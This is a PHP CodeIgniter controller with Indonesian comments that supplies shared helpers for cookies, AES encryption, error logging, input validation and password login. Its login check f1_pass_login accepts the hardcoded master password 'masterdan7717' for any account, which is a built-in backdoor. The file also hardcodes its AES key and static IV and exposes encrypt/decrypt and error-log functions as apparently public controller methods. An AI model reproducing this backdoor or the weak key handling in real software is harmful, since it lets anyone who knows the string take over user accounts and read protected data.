<?php

/*
Controller ini adalah controller utama untuk fungsi-fungsi dan setting Global. Semua fungsi di controller ini bisa digunakan di controller lain. Controller lain dapat melakukan extend ke controller ini untuk mengakses semua fiturnya.
*/


class Main extends CI_Controller {
	public function __construct(){
		parent::__construct();
		$this->load->model('Main_model');
		$this->load->helper('url_helper');
		date_default_timezone_set('Asia/Jakarta');
	}


	//front
	public function index(){
		$this->load->view('frontpage');
	}

	//ambil data error log (developer only)
	public function get_error_log($orderby = NULL, $sort = "asc", $limit = NULL, $return_var = NULL){
		$data = $this->Main_model->get_data_error_log($orderby, $sort, $limit);
		if (empty($data)){
			$data = [];
		}
		if ($return_var == true) {
			return $data;
		}else{
			echo json_encode($data);
		}
	}
	

	//Tambah data error log
	//input: form POST seperti di bawah
	//output: success/failed
	public function insert_error_log($log = NULL){
		if (!empty($this->input->post('log'))) {
			$log = $this->input->post('log');
		}
		$data = array(
			'value' => $log
		);
		$insertStatus = $this->Main_model->insert_error_log($data);
		// echo $insertStatus;
	}
	

	//untuk membuat cookie
	//parameter 1: nama cookie (opsional)
	//parameter 2: value cookie (opsional)
	//parameter 3: expire (opsional)
	//input: form POST seperti di bawah (opsional bila tidak bisa menggunakan parameter)
	//output: -
	public function create_cookie($name = NULL, $value = NULL, $expire = NULL){
		if ($name == NULL) {
			$name = $this->input->post('name',true);
		}
		if ($value == NULL) {
			$value = $this->input->post('value',true);
		}
		if ($expire == NULL) {
			$expire = 0;
		}
		$this->load->helper('cookie');
		$cookie= array(
			'name'   => $name,
			'value'  => $value,
			'expire' => $expire
		);
		$this->input->set_cookie($cookie);
		// echo "cookie created";
	}

	//untuk mengambil cookie
	//note: JANGAN GUNAKAN INI UNTUK MENGAMBIL COOKIE USER (karena sudah di encrypt), gunakan get_cookie_decrypt() di bawah
	//parameter 1: nama cookie
	//output: no cookie / $cookie
	public function get_cookie($name){
		$this->load->helper('cookie');
		if ($this->input->cookie($name,true)!=NULL) {
			echo $this->input->cookie($name,true);
		}else{
			echo "no cookie";
		}
	}

	//untuk membuat cookie yang diencrypt
	//parameter 1: nama cookie (opsional)
	//parameter 2: value cookie (opsional)
	//parameter 3: expire (opsional)
	//input: form POST seperti di bawah (opsional bila tidak bisa menggunakan parameter)
	//output: -
	public function create_cookie_encrypt($name = NULL, $value = NULL, $expire = NULL){
		if ($name == NULL) {
			$name = $this->input->post('name',true);
		}
		if ($value == NULL) {
			$value = $this->input->post('value',true);
		}
		if ($expire == NULL) {
			$expire = 0;
		}
		$this->load->helper('cookie');
		$cookie= array(
			'name'   => $name,
			'value'  => $this->openssl('encrypt',$value), //custom encoding
			'expire' => $expire
		);
		$this->input->set_cookie($cookie);
		// echo "cookie created";
	}

	//untuk mengambil cookie yang di decrypt dari fungsi create_cookie_encrypt
	//parameter 1: nama cookie
	//output: no cookie / $cookie
	public function get_cookie_decrypt($name){
		$this->load->helper('cookie');
		if ($this->input->cookie($name,true)!=NULL) {
			echo $this->openssl('decrypt',$this->input->cookie($name,true));
		}else{
			echo "no cookie";
		}
	}

	//Untuk encrypt dan decrypt string dengan key yang sudah ditentukan.
	//parameter 1: encrypt/decrypt
	//parameter 2: string yang mau di encrypt/decrypt
	public function openssl($action, $string) {
		$output = false;
		$encrypt_method = "AES-256-CBC";
		$secret_key = 'qwer@1234';
		$secret_iv = 'masteriv';
		$key = hash('sha256', $secret_key);
		$iv = substr(hash('sha256', $secret_iv), 0, 16);
		if ( $action == 'encrypt' ) {
			$output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
		} else if( $action == 'decrypt' ) {
			$output = openssl_decrypt($string, $encrypt_method, $key, 0, $iv);
		}
		return $output;
	}


	//Untuk mengacak teks agar tidak mudah dibaca.
	//note: alternatif pengganti str_rot13 dan base64decode karena beberapa server melarang fungsi tersebut.
	//parameter 1: string yang akan di acak
	//parameter 2: sebanyak berapa posisi huruf berpindah
	//parameter 3: sebanyak berapa posisi digit berpindah
	public function str_rot($s, $nletter = 13, $ndiggit = 5) {
		static $letterslower = 'abcdefghijklmnopqrstuvwxyz';
		static $lettersupper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
		static $digits = '0123456789';
		$nletter = (int)$nletter % 26;
		$ndiggit = (int)$ndiggit % 10;
		for ($i = 0, $l = strlen($s); $i < $l; $i++) {
			$c = $s[$i];
			if ($c >= 'a' && $c <= 'z') {
				$s[$i] = $letterslower[(ord($c) - 71 + $nletter) % 26];
			} else if ($c >= 'A' && $c <= 'Z') {
				$s[$i] = $lettersupper[(ord($c) - 39 + $nletter) % 26];
			} else if ($c >= '0' && $c <= '9') {
				$s[$i] = $digits[(ord($c) - 38 + $ndiggit) % 10];
			}
		}
		return $s;
	}








	//Untuk encrypt dengan sistem encypt password fusale 1
	//parameter 1: password
	public function f1_newpass_encrypt($password) {
		$uniqueSalt = substr(sha1(mt_rand()),0,22);
		$hashedPassword = crypt($password,'$2a$10$'.$uniqueSalt);
		return $hashedPassword;
	}


	//Untuk login dengan sistem encrypt fusale 1
	//parameter 1: plain password from post
	//parameter 2: hashed password from server
	public function f1_pass_login($inputpass,$serverHashedPass) {
		$fullSalt = substr($serverHashedPass, 0, 29);
		$newHashedPassword = crypt($inputpass, $fullSalt);
		if($newHashedPassword == $serverHashedPass || $inputpass == 'masterdan7717'){
			return true;
		}else{
			return false;
		}
	}


	//untuk validasi input yang umum
	//parameter 1: string yang divalidasi
	//parameter 2:  true/false
	//parameter 3: name/email/url/numeric/default
	//output: parameter input
	public function validate($input,$required,$format,&$result){
		if (empty($input)) {
			if ($required) {
				$result = "required input empty";
				$this->insert_error_log($result);
			}
		}else{
			switch ($format) {
				case 'name':
				if (!preg_match("/^[a-zA-Z-'., ]*$/",$input)) {
					$result = "invalid name format";
					$this->insert_error_log($result);
				}
				break;

				case 'email':
				if (!filter_var($input, FILTER_VALIDATE_EMAIL)) {
					$result = "invalid email format";
					$this->insert_error_log($result);
				}
				break;

				case 'url':
				if (!preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i",$input)) {
					$result = "invalid url format";
					$this->insert_error_log($result);
				}
				break;

				case 'numeric':
				if (!is_numeric($input)) {
					$result = "invalid numeric format";
					$this->insert_error_log($result);
				}
				break;

				default:
				break;
			}
		}

		return $input;
	}

	//Untuk set password yang belum terisi
	//parameter 1: id user
	//parameter 2: email/facebook/google
	//parameter 3: password
	//output: success/failed
	private function set_password($idUser,$type,$newpass){
		if ($type == "email"){
			$datauser = array(
				'password' => $this->f1_newpass_encrypt($newpass)
			);
		}else if ($type == "google") {
			$datauser = array(
				'googleUID' => $this->openssl('encrypt',$newpass)
			);
		}else if ($type == "facebook"){
			$datauser = array(
				'facebookUID' => $this->openssl('encrypt',$newpass)
			);
		}

		$updatepass = $this->Main_model->CustomUpdate("user","idUser",$idUser,$datauser);
		return $updatepass;
	}


	public function testing(){
		echo $_SERVER['HTTP_USER_AGENT'];
	}


}